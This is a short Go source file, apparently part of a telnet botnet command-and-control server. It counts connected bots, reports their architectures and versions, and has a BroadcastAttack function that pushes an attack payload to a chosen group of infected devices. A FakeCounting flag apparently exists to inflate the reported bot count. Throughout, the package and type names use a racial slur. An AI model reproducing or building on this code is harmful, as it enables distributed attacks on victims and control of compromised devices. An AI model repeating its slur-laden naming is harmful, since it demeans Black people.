package niggers

import (
	slavev2 "advanced-telnet-cnc/source/niggers/v2"
	"net"
)

type Slave struct {
	Name string
	Conn net.Conn
}

var (
	FakeCounting = false
)

func Count() int {
	return slavev2.List.Count()
}

func Distribution() map[string]int {
	return slavev2.List.Distribution()
}

func Arches() map[string]int {
	return slavev2.List.Arches()
}

func Versions() map[string]int {
	return slavev2.List.Versions()
}

func BroadcastAttack(payload []byte, group string, devices int) int {
	slavev2.List.Command <- &slavev2.NiggerCommand{Buffer: payload, Count: devices, Group: group}
	return Count()
}
